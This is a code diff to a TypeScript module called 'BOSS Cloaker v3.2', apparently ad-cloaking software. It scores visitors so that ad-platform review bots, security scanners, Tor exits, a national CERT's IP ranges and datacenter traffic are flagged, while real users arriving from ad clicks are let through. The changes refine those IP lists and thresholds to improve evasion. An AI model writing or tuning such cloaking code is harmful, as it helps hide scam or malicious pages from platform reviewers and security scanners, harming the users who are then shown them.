@@ -1,9 +1,13 @@
 /**
  * BOSS Cloaker v3.2 - Bot Detection Engine
  * 
- * CRITICAL FIX: Click IDs (gclid, fbclid, msclkid) are NOT scored.
- * These come from REAL users clicking ads, not bots.
- * Google verification bots DON'T have gclid - they use known IP ranges.
+ * Key design decisions:
+ * - Click IDs (gclid, fbclid, msclkid) are HUMAN signals that REDUCE score
+ * - Platform IP/UA deduplication prevents double-scoring (bing/microsoft)
+ * - Ad referer only flags bot-specific URLs (doubleclick, syndication),
+ *   NOT user click URLs (aclk, pagead)
+ * - Datacenter score (30) alone doesn't exceed any threshold
+ * - First-time visitors without cookies are NOT penalized
  */
 
 import net from "net";
@@ -141,10 +145,15 @@ const USOM_MATCHER = new IpRangeMatcher([
 ]);
 
 const SECURITY_SCANNER_MATCHER = new IpRangeMatcher([
-  '74.125.0.0/16', '185.220.101.0/24', '192.88.134.0/23', '185.93.228.0/22',
-  '199.83.128.0/21', '198.143.32.0/19', '23.0.0.0/12', '23.32.0.0/11',
-  '23.64.0.0/14', '23.72.0.0/13', '96.16.0.0/15', '96.6.0.0/15',
-  '104.64.0.0/10', '184.24.0.0/13', '184.50.0.0/15', '184.84.0.0/14',
+  // Removed 74.125.0.0/16 — already in GOOGLE_MATCHER (was causing redundant scoring)
+  '185.220.101.0/24', '192.88.134.0/23', '185.93.228.0/22',
+  '199.83.128.0/21', '198.143.32.0/19',
+  // Tor exit nodes
+  '185.220.100.0/22', '185.220.101.0/24', '185.220.102.0/24',
+  // Known scanner infrastructure
+  '71.6.135.0/24', '71.6.146.0/24', '71.6.158.0/24', '71.6.167.0/24',
+  '80.82.77.0/24', '80.82.78.0/24', '89.248.160.0/20',
+  '93.174.88.0/21', '94.102.49.0/24', '198.20.69.0/24', '198.20.70.0/24',
 ]);
 
 const DATACENTER_MATCHER = new IpRangeMatcher([
@@ -177,8 +186,14 @@ const DATACENTER_MATCHER = new IpRangeMatcher([
   '149.56.0.0/16', '151.80.0.0/16', '158.69.0.0/16', '164.132.0.0/16',
   '167.114.0.0/16', '176.31.0.0/16', '178.32.0.0/15', '188.165.0.0/16',
   '198.27.64.0/18', '198.50.128.0/17',
-  // AWS (subset - most common scanner ranges)
-  '3.0.0.0/9', '18.0.0.0/8', '52.0.0.0/8', '54.0.0.0/8',
+  // AWS — targeted ranges (removed overly broad /8 and /9 that blocked VPN users)
+  '3.8.0.0/13', '3.16.0.0/14', '3.80.0.0/12', '3.96.0.0/15',
+  '3.112.0.0/14', '3.120.0.0/14',
+  '18.130.0.0/16', '18.132.0.0/14', '18.144.0.0/15', '18.156.0.0/14',
+  '18.184.0.0/15', '18.188.0.0/16', '18.191.0.0/16', '18.196.0.0/15',
+  '18.200.0.0/14', '18.204.0.0/14', '18.208.0.0/13', '18.216.0.0/14',
+  '18.220.0.0/14', '18.224.0.0/14', '18.228.0.0/16', '18.232.0.0/14',
+  '18.236.0.0/15',
 ]);
 
 // ============================================
@@ -295,17 +310,27 @@ export async function detectBot(
 
   // ============================================
   // 1. PLATFORM IP DETECTION (most reliable)
+  // Deduplicate: bing/microsoft share the same matcher and UA patterns.
+  // Track checked matchers/patterns to prevent double-scoring.
   // ============================================
+  const checkedIpMatchers = new Set<IpRangeMatcher>();
+  const checkedUaPatterns = new Set<string>();
+
   for (const platform of blockedPlatforms) {
     const matcher = PLATFORM_IP_MATCHERS[platform];
-    if (matcher?.contains(ip)) {
+    if (matcher && !checkedIpMatchers.has(matcher) && matcher.contains(ip)) {
       score += 100;
       reasons.push(`${platform.toUpperCase()}_IP_DETECTED`);
+      checkedIpMatchers.add(matcher);
+    } else if (matcher) {
+      checkedIpMatchers.add(matcher);
     }
 
     const uaPatterns = PLATFORM_UA_PATTERNS[platform];
     if (uaPatterns) {
       for (const pattern of uaPatterns) {
+        if (checkedUaPatterns.has(pattern)) continue;
+        checkedUaPatterns.add(pattern);
         if (uaLower.includes(pattern)) {
           score += 80;
           reasons.push(`${platform.toUpperCase()}_UA: ${pattern}`);
@@ -317,6 +342,7 @@ export async function detectBot(
 
   // ============================================
   // 2. ALWAYS CHECK: Security/Datacenter IPs
+  // Scores adjusted so single signals don't exceed thresholds alone
   // ============================================
   if (USOM_MATCHER.contains(ip)) {
     score += 100;
@@ -324,12 +350,12 @@ export async function detectBot(
   }
 
   if (SECURITY_SCANNER_MATCHER.contains(ip)) {
-    score += 90;
+    score += 50;
     reasons.push('SECURITY_SCANNER_IP');
   }
 
   if (DATACENTER_MATCHER.contains(ip)) {
-    score += 60;
+    score += 30;
     reasons.push('DATACENTER_IP');
   }
 
@@ -374,17 +400,17 @@ export async function detectBot(
     reasons.push('CHROME_WITHOUT_SEC_FETCH');
   }
 
-  // Multiple proxy headers
-  if (headers['via'] || (headers['x-forwarded-for'] && headers['x-forwarded-for'].includes(','))) {
+  // Explicit proxy header (via) — only penalize this, NOT x-forwarded-for
+  // which is normal behind CDN (Cloudflare/Vercel always add x-forwarded-for)
+  if (headers['via']) {
     score += 10;
-    reasons.push('PROXY_HEADERS_DETECTED');
+    reasons.push('PROXY_VIA_HEADER');
   }
 
   // ============================================
   // 5. CLICK ID HANDLING
-  // CRITICAL: Do NOT add score for click IDs!
-  // gclid = real user clicked a Google Ad
-  // Google bots DON'T have gclid
+  // gclid/fbclid/msclkid = REAL user clicked an ad
+  // Bots DON'T carry these → use as HUMAN signal (subtract score)
   // ============================================
   let detectedClickId: string | undefined;
 
@@ -395,8 +421,9 @@ export async function detectBot(
         const value = urlObj.searchParams.get(paramName);
         if (value) {
           detectedClickId = `${paramName}=${value.substring(0, 20)}`;
-          // LOG ONLY - NO SCORE PENALTY
-          reasons.push(`CLICK_ID_LOGGED: ${paramName} (${platform})`);
+          // HUMAN SIGNAL: subtract score — real ad clicks have these, bots don't
+          score -= 15;
+          reasons.push(`CLICK_ID_HUMAN_SIGNAL: ${paramName} (${platform})`);
           break;
         }
       }
@@ -424,42 +451,43 @@ export async function detectBot(
   }
 
   // ============================================
-  // 7. AD PLATFORM REFERER (not from user click - from bot crawl)
+  // 7. AD PLATFORM REFERER (bot verification crawls)
+  // IMPORTANT: Removed google.com/aclk, bing.com/aclk, google.com/pagead,
+  // facebook.com/ads, bing.com/ads — these are REAL user click redirect URLs.
+  // Only keep patterns used by ad platform BOTS verifying ad placements.
   // ============================================
   if (referer) {
     const refLower = referer.toLowerCase();
-    const adRefererPatterns = [
-      'googleads.g.doubleclick.net', 'googlesyndication.com',
-      'google.com/pagead', 'google.com/aclk',
-      'facebook.com/ads', 'facebook.com/tr', 'business.facebook.com',
-      'bing.com/aclk', 'bing.com/ads',
+    const botRefererPatterns = [
+      'googleads.g.doubleclick.net',  // Ad serving system bot
+      'googlesyndication.com',         // Ad syndication bot
+      'facebook.com/tr',               // Facebook Pixel tracking bot
+      'business.facebook.com',         // Facebook Business crawler
     ];
-    for (const adRef of adRefererPatterns) {
-      if (refLower.includes(adRef)) {
-        const matchedPlatform = blockedPlatforms.find(p => adRef.includes(p));
+    for (const botRef of botRefererPatterns) {
+      if (refLower.includes(botRef)) {
+        const matchedPlatform = blockedPlatforms.find(p => botRef.includes(p));
         if (matchedPlatform) {
           score += 30;
-          reasons.push(`AD_REFERER: ${adRef}`);
+          reasons.push(`BOT_REFERER: ${botRef}`);
         }
         break;
       }
     }
   }
 
-  // ============================================
-  // 8. NO COOKIES WITH REFERER (bot-like)
-  // ============================================
-  if (!headers['cookie'] && referer) {
-    score += 15;
-    reasons.push('NO_COOKIES_WITH_REFERER');
-  }
+  // REMOVED: NO_COOKIES_WITH_REFERER check
+  // Every first-time visitor arriving from any referral has no cookies.
+  // This was penalizing ALL first-visit ad traffic with +15, causing false positives.
 
   // ============================================
   // FINAL DECISION
+  // Ensure score doesn't go below 0 from negative signals
   // ============================================
+  const finalScore = Math.max(0, score);
   return {
-    isBot: score >= threshold,
-    score,
+    isBot: finalScore >= threshold,
+    score: finalScore,
     reasons,
     clickId: detectedClickId,
   };
